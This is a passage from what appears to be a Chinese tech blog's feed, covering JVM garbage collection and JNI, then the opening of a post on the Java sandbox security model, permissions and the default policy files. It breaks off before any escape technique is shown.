precleaning）</p><p>这个阶段任然是并发的，JVM查找正在执行“并发标记”阶段时候进入老年代的对象（可能这时会有对象从新生代晋升到老年代，或被分配到老年代）。通过重新扫描，减少在一个阶段“重新标记”的工作，因为下一阶段会STW。</p></li><li><p>重新标记（STW remark）</p><p>这个阶段会再次暂停正在执行的应用线程，重新重根对象开始查找并标记并发阶段遗漏的对象（在并发标记阶段结束后对象状态的更新导致），并处理对象关联。这一次耗时会比“初始标记”更长，并且这个阶段可以并行标记。</p></li><li><p>并发清理（Concurrent sweeping）</p><p>这个阶段是并发的，应用线程和GC清除线程可以一起并发执行。</p></li><li><p>并发重置（Concurrent reset）</p><p>这个阶段任然是并发的，重置CMS收集器的数据结构，等待下一次垃圾回收。</p></li></ul><h5 id="CMS的缺点"><a href="#CMS的缺点" class="headerlink" title="CMS的缺点"></a>CMS的缺点</h5><ol><li>内存碎片。由于使用了 标记-清理 算法，导致内存空间中会产生内存碎片。不过CMS收集器做了一些小的优化，就是把未分配的空间汇总成一个列表，当有JVM需要分配内存空间的时候，会搜索这个列表找到符合条件的空间来存储这个对象。但是内存碎片的问题依然存在，如果一个对象需要3块连续的空间来存储，因为内存碎片的原因，寻找不到这样的空间，就会导致Full GC。</li><li>需要更多的CPU资源。由于使用了并发处理，很多情况下都是GC线程和应用线程并发执行的，这样就需要占用更多的CPU资源，也是牺牲了一定吞吐量的原因。</li><li>需要更大的堆空间。因为CMS标记阶段应用程序的线程还是执行的，那么就会有堆空间继续分配的问题，为了保障CMS在回收堆空间之前还有空间分配给新加入的对象，必须预留一部分空间。CMS默认在老年代空间使用68%时候启动垃圾回收。可以通过-XX:CMSinitiatingOccupancyFraction=n来设置这个阀值。</li></ol><h4 id="GarbageFirst（G1）"><a href="#GarbageFirst（G1）" class="headerlink" title="GarbageFirst（G1）"></a>GarbageFirst（G1）</h4><p>这是一个新的垃圾回收器，既可以回收新生代也可以回收老年代。</p><p>SunHotSpot1.6u14以上EarlyAccess版本加入了这个回收器，Sun公司预期SunHotSpot1.7发布正式版本。通过重新划分内存区域，整合优化CMS，同时注重吞吐量和响应时间。杯具的是Oracle收购这个收集器之后将其用于商用收费版收集器。因此目前暂时没有发现哪个公司使用它。</p><p>G1收集器的运作大致可划分为以下几个步骤：</p><ol><li>初始标记（Initial Marking）：初始标记阶段仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS（Next Top at Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可用的Region中创建新对象，这阶段需要停顿线程，但耗时很短。</li><li>并发标记（Concurrent Marking）：并发标记阶段是从GC Root开始对堆中对象进行可达性分析，找出存活的对象，这阶段耗时较长，但可与用户程序并发执行。</li><li>最终标记（Final Marking）：最终标记阶段是为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程Remembered Set Logs里面，最终标记阶段需要把Remembered Set Logs的数据合并到Remembered Set中，这阶段需要停顿线程，但是可并行执行。</li><li>筛选回收（Live Data Counting and Evacuation）：筛选回收阶段首先对各个Region的回收价值和成本进行排序，根据用户所期望的GC停顿时间来制定回收计划，这个阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率。</li></ol><h3 id="GC中的相关问题"><a href="#GC中的相关问题" class="headerlink" title="GC中的相关问题"></a>GC中的相关问题</h3><h4 id="问题1：怎么定义活着的对象？"><a href="#问题1：怎么定义活着的对象？" class="headerlink" title="问题1：怎么定义活着的对象？"></a>问题1：怎么定义活着的对象？</h4><p>从根引用开始，对象的内部属性可能也是引用，只要能级联到的都被认为是活着的对象。</p><h4 id="问题2：什么是根？"><a href="#问题2：什么是根？" class="headerlink" title="问题2：什么是根？"></a>问题2：什么是根？</h4><p>本地变量引用，操作数栈引用，PC寄存器，本地方法栈引用等这些都是根。</p><h4 id="问题3：对象进入Old区域有什么坏处？"><a href="#问题3：对象进入Old区域有什么坏处？" class="headerlink" title="问题3：对象进入Old区域有什么坏处？"></a>问题3：对象进入Old区域有什么坏处？</h4><p>Old区域一般称为老年代，老年代与新生代不一样。新生代，我们可以认为存活下来的对象很少，而老年代则相反，存活下来的对象很多，所以JVM的堆内存，才是我们通常关注的主战场，因为这里面活着的对象非常多，所以发生一次FULL GC，来找出来所有存活的对象是非常耗时的，因此，我们应该避免FULL GC的发生。</p><h4 id="问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？"><a href="#问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？" class="headerlink" title="问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？"></a>问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？</h4><p>一般来说很小，我们大概知道它与Young差不多相差一倍的比例，设置的参数主要有两个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:SurvivorRatio=8</span><br><span class="line">-XX:InitialSurvivorRatio=8</span><br></pre></td></tr></table></figure><p>第一个参数（-XX:SurvivorRatio）是Eden和Survivous区域比重（注意Survivous一般包含两个区域S0和S1，这里是一个Survivous的大小）。如果将-XX:SurvivorRatio=8设置为8，则说明Eden区域是一个Survivous区的8倍，换句话说S0或S1空间是整个Young空间的1/10，剩余的8/10由Eden区域来使用。</p><p>第二个参数（-XX:InitialSurvivorRatio）是Young/S0的比值，当其设置为8时，表示S0或S1占整个Young空间的1/8（或12.5%）。</p><h4 id="问题5：一个对象每次Minor-GC时，活着的对象都会在S0和S1区域转移，讲过MInor-GC多少次后，会进入Old区域呢？"><a href="#问题5：一个对象每次Minor-GC时，活着的对象都会在S0和S1区域转移，讲过MInor-GC多少次后，会进入Old区域呢？" class="headerlink" title="问题5：一个对象每次Minor GC时，活着的对象都会在S0和S1区域转移，讲过MInor GC多少次后，会进入Old区域呢？"></a>问题5：一个对象每次Minor GC时，活着的对象都会在S0和S1区域转移，讲过MInor GC多少次后，会进入Old区域呢？</h4><p>默认是15次，参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--XX:MaxTenuringThreshold=15</span><br></pre></td></tr></table></figure><p>计数器会在对象的头部记录它的交换次数。</p><h4 id="问题6：为什么发生FULL-GC会带来很大的危害？"><a href="#问题6：为什么发生FULL-GC会带来很大的危害？" class="headerlink" title="问题6：为什么发生FULL GC会带来很大的危害？"></a>问题6：为什么发生FULL GC会带来很大的危害？</h4><p>在发生FULL GC的时候，意味着JVM会安全的暂停所有正在执行的线程（Stop The World），来回收内存空间，在这个时间内，所有除了回收垃圾的线程外，其他有关JAVA的程序，代码都会静止，反映到系统上，就会出现系统响应大幅度变慢，卡机等状态。</p><h4 id="问题7：JVM-GC回收哪个区域内的垃圾？"><a href="#问题7：JVM-GC回收哪个区域内的垃圾？" class="headerlink" title="问题7：JVM GC回收哪个区域内的垃圾？"></a>问题7：JVM GC回收哪个区域内的垃圾？</h4><p>需要注意的是，JVM GC只回收堆区和方法区内的对象。而栈区的数据，在超出作用域后会被JVM自动释放掉，所以其不在JVM GC的管理范围内。</p><h4 id="问题8：JVM-GC怎么判断对象可以被回收了？"><a href="#问题8：JVM-GC怎么判断对象可以被回收了？" class="headerlink" title="问题8：JVM GC怎么判断对象可以被回收了？"></a>问题8：JVM GC怎么判断对象可以被回收了？</h4><ul><li>对象没有引用</li><li>作用域发生未捕获异常</li><li>程序在作用域正常执行完毕</li><li>程序执行了System.exit()</li><li>程序发生意外终止（被杀线程等）</li></ul><p>在Java程序中不能显式的分配和注销缓存，因为这些事情JVM都帮我们做了，那就是GC。</p><p>有些时候我们可以将相关的对象设置成null 来试图显示的清除缓存，但是并不是设置为null 就会一定被标记为可回收，有可能会发生逃逸。</p><p>将对象设置成null 至少没有什么坏处，但是使用System.gc() 便不可取了，使用System.gc() 时候并不是马上执行GC操作，而是会等待一段时间，甚至不执行，而且System.gc() 如果被执行，会触发Full GC ，这非常影响性能。</p><h4 id="问题9：JVM-GC什么时候执行？"><a href="#问题9：JVM-GC什么时候执行？" class="headerlink" title="问题9：JVM GC什么时候执行？"></a>问题9：JVM GC什么时候执行？</h4><p>Eden区空间不够存放新对象的时候，执行Minro GC。升到老年代的对象大于老年代剩余空间的时候执行Full GC，或者小于的时候被HandlePromotionFailure 参数强制Full GC 。调优主要是减少 Full GC 的触发次数，可以通过 NewRatio 控制新生代转老年代的比例，通过MaxTenuringThreshold 设置对象进入老年代的年龄阀值（后面会介绍到）。</p><h2 id="0x06-本地方法接口"><a href="#0x06-本地方法接口" class="headerlink" title="0x06 本地方法接口"></a>0x06 本地方法接口</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNI（Java Native Interface），本地方法接口。</p><p>简单来讲，一个Native Method就是一个Java调用非Java代码的接口，一个Native Method是这样一个Java方法：该方法的底层实现由非Java语言实现，比如C。这个特征并非Java特有，很多其他的编程语言都有这一机制，比如在C++中，你可以用extern “C” 告知C++编译器去调用一个C的函数。</p><p>在定义一个native method时，并不提供实现体（有些像定义一个Java interface），因为其实现体是由非Java语言在外面实现的。</p><p>本地接口的作用是融合不同的编程语言为Java所用，它的初衷是融合C/C++程序。</p><p>标识符native可以与其他所有的Java标识符连用，但是abstract除外。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span>  <span class="class"><span class="keyword">class</span> <span class="title">IHaveNatives</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//abstract 没有方法体</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">abstractMethod</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//native 和 abstract不能共存，native是有方法体的，由C语言来实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">Native1</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">long</span> <span class="title">Native2</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">synchronized</span> <span class="keyword">private</span> <span class="keyword">float</span> <span class="title">Native3</span><span class="params">(Object o)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">void</span> <span class="title">Native4</span><span class="params">(<span class="keyword">int</span>[] array)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为何使用JNI"><a href="#为何使用JNI" class="headerlink" title="为何使用JNI"></a>为何使用JNI</h3><p>Java使用起来非常方便，然而有些层次的任务用Java实现起来不容易，或者我们对程序的效率很在意时，问题就来了。</p><ul><li>与Java环境外交互：有时Java应用需要与Java外面的环境交互，这是本地方法存在的主要原因。 你可以想想Java需要与一些底层系统，如擦偶偶系统或某些硬件交换信息时的情况。本地方法正式这样的一种交流机制：它为我们提供了一个非常简洁的接口，而且我们无需去了解Java应用之外的繁琐细节。</li><li>与操作系统交互（比如线程最后要回归于操作系统线程）：JVM支持着Java语言本身和运行库，它是Java程序赖以生存的平台，它由一个解释器（解释字节码）和一些连接到本地代码的库组成。然而不管怎样，它毕竟不是一个完整的系统，它经常依赖于一些底层系统的支持。这些底层系统常常是强大的操作系统。通过使用本地方法，我们得以用Java实现了jre的与底层系统的交互，甚至JVM的一些部分就是用C写的。还有，如果我们要使用一些Java语言本身没有提供封装的操作系统特性时，我们也需要使用本地方法。</li><li>Sun’s Java：Sun的解释器是用C实现的，这使得它能像一些普通的C一样与外部交互。jre大部分是用Java实现的，它也通过一些本地方法与外界交互。例如：类java.lang.Thread的setPriority()方法是用Java实现的，但是它实现调用的是该类里的本地方法setPriority0()。这个本地方法是用C实现的，并被植入JVM内部，在Windows 95的平台上，这个本地方法最终将调用Win32 setPriority() API。这是一个本地方法的具体实现由JVM直接提供，更多的情况是本地方法由外部的动态链接库（external dynamic link library）提供，然后被JVM调用。</li></ul><h2 id="0x07-执行引擎"><a href="#0x07-执行引擎" class="headerlink" title="0x07 执行引擎"></a>0x07 执行引擎</h2><p>参考：<a href="https://blog.csdn.net/it_gjw/article/details/80627661" target="_blank" rel="noopener">JVM字节码执行引擎</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文直接参考或引自网上文章。&lt;/p&gt;
&lt;h2 id=&quot;0x01-JVM简介&quot;&gt;&lt;a href=&quot;#0
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析Java沙箱逃逸</title>
    <link href="https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://www.mi1k7ea.com/2020/05/03/浅析Java沙箱逃逸/</id>
    <published>2020-05-03T08:11:24.000Z</published>
    <updated>2020-05-07T16:31:42.205Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Java沙箱"><a href="#0x01-Java沙箱" class="headerlink" title="0x01 Java沙箱"></a>0x01 Java沙箱</h2><p>程序员编写一个Java程序，默认的情况下可以访问该机器的任意资源，比如读取、删除一些文件或者网络操作等。当你把程序部署到正式的服务器上，系统管理员要为服务器的安全承担责任，那么他可能不敢确定你的程序会不会访问不该访问的资源，为了消除潜在的安全隐患，他可能有两种办法：</p><ol><li><p>让你的程序在一个限定权限的帐号下运行。</p></li><li><p>利用Java的沙箱机制来限定你的程序不能为非作歹。以下用于介绍该机制。</p></li></ol><h3 id="Java沙箱简介"><a href="#Java沙箱简介" class="headerlink" title="Java沙箱简介"></a>Java沙箱简介</h3><p>Java安全模型的核心就是Java沙箱（sandbox），什么是沙箱？沙箱是一个限制程序运行的环境。限制程序运行一方面是为了保护系统资源，同时另一方面也为了保护程序自己。沙箱主要限制系统资源访问，那系统资源包括什么？——CPU、内存、文件系统、网络。不同级别的沙箱对这些资源访问的限制也可以不一样。</p><p>所有的Java程序运行都可以指定沙箱，可以定制安全策略。</p><h3 id="Java中的安全模型"><a href="#Java中的安全模型" class="headerlink" title="Java中的安全模型"></a>Java中的安全模型</h3><p>在Java中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信的。对于授信的本地代码，可以访问一切本地资源。而对于非授信的远程代码在早期的Java实现中，安全依赖于沙箱 (Sandbox) 机制。如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/1.png" alt=""></p><p>但如此严格的安全机制也给程序的功能扩展带来障碍，比如当用户希望远程代码访问本地系统的文件时候，就无法实现。因此在后续的 Java1.1 版本中，针对安全机制做了改进，增加了安全策略，允许用户指定代码对本地资源的访问权限。如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/2.png" alt=""></p><p>在 Java1.2 版本中，再次改进了安全机制，增加了代码签名。不论本地代码或是远程代码，都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，来实现差异化的代码执行权限控制。如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/3.png" alt=""></p><p>当前最新的安全机制实现，则引入了域 (Domain) 的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域 (Protected Domain)，对应不一样的权限 (Permission)。存在于不同域中的类文件就具有了当前域的全部权限，如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/4.png" alt=""></p><p>以上提到的都是基本的Java安全模型概念，在应用开发中还有一些关于安全的复杂用法，其中最常用到的API就是doPrivileged()。doPrivileged()方法能够使一段受信任代码获得更大的权限，甚至比调用它的应用程序还要多，可做到临时访问更多的资源。有时候这是非常必要的，可以应付一些特殊的应用场景。例如，应用程序可能无法直接访问某些系统资源，但这样的应用程序必须得到这些资源才能够完成功能。</p><h3 id="Java沙箱的基本组成"><a href="#Java沙箱的基本组成" class="headerlink" title="Java沙箱的基本组成"></a>Java沙箱的基本组成</h3><p>Java沙箱由以下几部分组成：</p><ul><li>字节码校验器（bytecode verifier）：确保Java类文件遵循Java语言规范。这样可以帮助Java程序实现内存保护。但是不是所有的类文件都会经过字节码校验，比如核心类。</li><li>类加载器（class loader）：所有的Java类都是通过类加载器加载的，可以自定义类加载器来设置加载类的权限。</li><li>存取控制器（access controller）：存取控制器可以控制核心API对操作系统的存取权限，而这个控制的策略设定，可以由用户指定。</li><li>安全管理器（security manager）：是核心API和操作系统之间的主要接口。实现权限控制，比存取控制器优先级高。</li><li>安全软件包（security package）：java.security下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性，包括：<ul><li>安全提供者</li><li>消息摘要</li><li>数字签名</li><li>加密</li><li>鉴别</li></ul></li></ul><p>其中ClassLoader在如下三个方面对Java沙箱起作用：</p><ol><li>它防止恶意代码去干涉善意的代码；</li><li>它守护了被信任的类库边界；</li><li>它将代码归入保护域，确定了代码可以进行哪些操作。</li></ol><p>虚拟机为不同的ClassLoader载入的类提供不同的命名空间，命名空间由一系列唯一的名称组成，每一个被装载的类将有一个名字，这个命名空间是由Java虚拟机为每一个ClassLoader维护的，它们互相之间甚至不可见。</p><p>ClassLoader采用的机制是双亲委派模式。从最内层JVM自带ClassLoader开始加载，外层恶意同名类得不到加载从而无法使用；由于严格通过包来区分了访问域，外层恶意的类通过内置代码也无法获得权限访问到内层类，破坏代码就自然无法生效。</p><h3 id="Java沙箱的要素"><a href="#Java沙箱的要素" class="headerlink" title="Java沙箱的要素"></a>Java沙箱的要素</h3><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>权限是指允许代码执行的操作。包含三部分：权限类型、权限名和允许的操作。权限类型是实现了权限的Java类名，是必需的。权限名一般就是对哪类资源进行操作的资源定位（比如一个文件名或者通配符、网络主机等），一般基于权限类型来设置，有的比如java.security.AllPermission不需要权限名。允许的操作也和权限类型对应，指定了对目标可以执行的操作行为，比如读、写等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">permission java.security.AllPermission;    <span class="comment">//权限类型</span></span><br><span class="line">permission java.lang.RuntimePermission <span class="string">"stopThread"</span>;    <span class="comment">//权限类型+权限名</span></span><br><span class="line">permission java.io.FilePermission <span class="string">"/tmp/foo"</span> <span class="string">"read"</span>;    <span class="comment">//权限类型+权限名+允许的操作</span></span><br></pre></td></tr></table></figure><p> 标准权限如下表：</p><table><thead><tr><th>说明</th><th>类型</th><th>权限名</th><th>操作</th><th>例子</th></tr></thead><tbody><tr><td>文件权限</td><td>java.io.FilePermission</td><td>文件名（平台依赖）</td><td>读、写、删除、执行</td><td>允许所有文件的读写删除执行：permission java.io.FilePermission “&lt;&lt; ALL FILES&gt;&gt;”, “read,write,delete,execute”;。允许对用户主目录的读：permission java.io.FilePermission “${user.home}/-“, “read”;</td></tr><tr><td>套接字权限</td><td>java.net.SocketPermission</td><td>主机名:端口</td><td>接收、监听、连接、解析</td><td>允许实现所有套接字操作：permission java.net.SocketPermission “:1-“, “accept,listen,connect,resolve”;。允许建立到特定网站的连接：permission java.net.SocketPermission “.abc.com:1-“, “connect,resolve”;</td></tr><tr><td>属性权限</td><td>java.util.PropertyPermission</td><td>需要访问的jvm属性名</td><td>读、写</td><td>读标准Java属性：permission java.util.PropertyPermission “java.”, “read”;。在sdo包中创建属性：permission java.util.PropertyPermission “sdo.”, “read,write”;</td></tr><tr><td>运行时权限</td><td>java.lang.RuntimePermission</td><td>多种权限名[见附录A]</td><td>无</td><td>允许代码初始化打印任务：permission java.lang.RuntimePermission “queuePrintJob”</td></tr><tr><td>AWT权限</td><td>java.awt.AWTPermission</td><td>6种权限名[见附录B]</td><td>无</td><td>允许代码充分使用robot类：permission java.awt.AWTPermission “createRobot”; permission java.awt.AWTPermission “readDisplayPixels”;</td></tr><tr><td>网络权限</td><td>java.net.NetPermission</td><td>3种权限名[见附录C]</td><td>无</td><td>允许安装流处理器：permission java.net.NetPermission “specifyStreamHandler”;。</td></tr><tr><td>安全权限</td><td>java.security.SecurityPermission</td><td>多种权限名[见附录D]</td><td>无</td><td></td></tr><tr><td>序列化权限</td><td>java.io.SerializablePermission</td><td>2种权限名[见附录E]</td><td>无</td><td></td></tr><tr><td>反射权限</td><td>java.lang.reflect.ReflectPermission</td><td>suppressAccessChecks（允许利用反射检查任意类的私有变量）</td><td>无</td><td></td></tr><tr><td>完全权限</td><td>java.security.AllPermission</td><td>无（拥有执行任何操作的权限）</td><td>无</td></tr></tbody></table><h4 id="代码源"><a href="#代码源" class="headerlink" title="代码源"></a>代码源</h4><p>代码源是类所在的位置，表示为URL地址。</p><h4 id="保护域"><a href="#保护域" class="headerlink" title="保护域"></a>保护域</h4><p>保护域用来组合代码源和权限，这是沙箱的基本概念。保护域就在于声明了比如由代码A可以做权限B这样的事情。</p><h4 id="策略文件"><a href="#策略文件" class="headerlink" title="策略文件"></a>策略文件</h4><p>策略文件是控制沙箱的管理要素，一个策略文件包含一个或多个保护域的项。策略文件完成了代码权限的指定任务，策略文件包括全局和用户专属两种。</p><p>JVM可以使用多个策略文件，不过一般来说下面两个最为常用。一个是全局的<code>$JREHOME/lib/security/java.policy</code>，作用于JVM的所有实例；另一个是用户自己的，可以存储到用户的主目录下。策略文件可以使用JDK自带的policytool工具编辑。</p><h5 id="java-policy"><a href="#java-policy" class="headerlink" title="java.policy"></a>java.policy</h5><p>我们看下默认的java.policy文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// Standard extensions get all permissions by default</span><br><span class="line"></span><br><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123;</span><br><span class="line">        permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// default permissions granted to all domains</span><br><span class="line"></span><br><span class="line">grant &#123;</span><br><span class="line">        // Allows any thread to stop itself using the java.lang.Thread.stop()</span><br><span class="line">        // method that takes no argument.</span><br><span class="line">        // Note that this permission is granted by default only to remain</span><br><span class="line">        // backwards compatible.</span><br><span class="line">        // It is strongly recommended that you either remove this permission</span><br><span class="line">        // from this policy file or further restrict it to code sources</span><br><span class="line">        // that you specify, because Thread.stop() is potentially unsafe.</span><br><span class="line">        // See the API specification of java.lang.Thread.stop() for more</span><br><span class="line">        // information.</span><br><span class="line">        permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line"></span><br><span class="line">        // allows anyone to listen on dynamic ports</span><br><span class="line">        permission java.net.SocketPermission &quot;localhost:0&quot;, &quot;listen&quot;;</span><br><span class="line"></span><br><span class="line">        // &quot;standard&quot; properies that can be read by anyone</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor.url&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.class.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.name&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.arch&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;file.separator&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;path.separator&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;line.separator&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.name&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.name&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.name&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>策略文件的内容格式就是这样，grant授权允许操作某个权限。这个默认的策略文件就指明了JDK扩展包可以有全部权限，允许代码stop线程，允许监听1099端口(1099号端口，是默认的服务器端RMI监听端口)等等。</p><p><strong>配置基本原则：</strong></p><p>在启用安全管理器的时候，配置遵循以下基本原则：</p><ol><li>没有配置的权限表示没有。</li><li>只能配置有什么权限，不能配置禁止做什么。</li><li>同一种权限可多次配置，取并集。</li><li>统一资源的多种权限可用逗号分割。</li></ol><p><strong>默认配置文件解释：</strong></p><p>第一部分授权：授权基于路径在<code>file:$/*</code>的class和jar包，所有权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第二部分授权：这是细粒度的授权，对某些资源的操作进行授权。具体不再解释，可以查看javadoc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123; </span><br><span class="line">    permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line">    ……   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>补充</strong>：当批量配置的时候（例如第一部分授权），有三种模式：</p><ul><li><code>directory/</code>表示directory目录下的所有.class文件，不包括.jar文件；</li><li><code>directory/*</code>表示directory目录下的所有的.class及.jar文件；</li><li><code>directory/-</code>表示directory目录下的所有的.class及.jar文件，包括子目录；</li></ul><p>　　可以通过<code>${}</code>来引用系统属性，如： <code>file:$/*</code></p><h5 id="java-security"><a href="#java-security" class="headerlink" title="java.security"></a>java.security</h5><p>另一个很重要的是参数文件——java.security，这个文件和策略文件在同一个目录下。这个参数文件定义了沙箱的一些参数。比如默认的沙箱文件是这样的，只截取部分内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br><span class="line"></span><br><span class="line"># whether or not we expand properties in the policy file</span><br><span class="line"># if this is set to false, properties ($&#123;...&#125;) will not 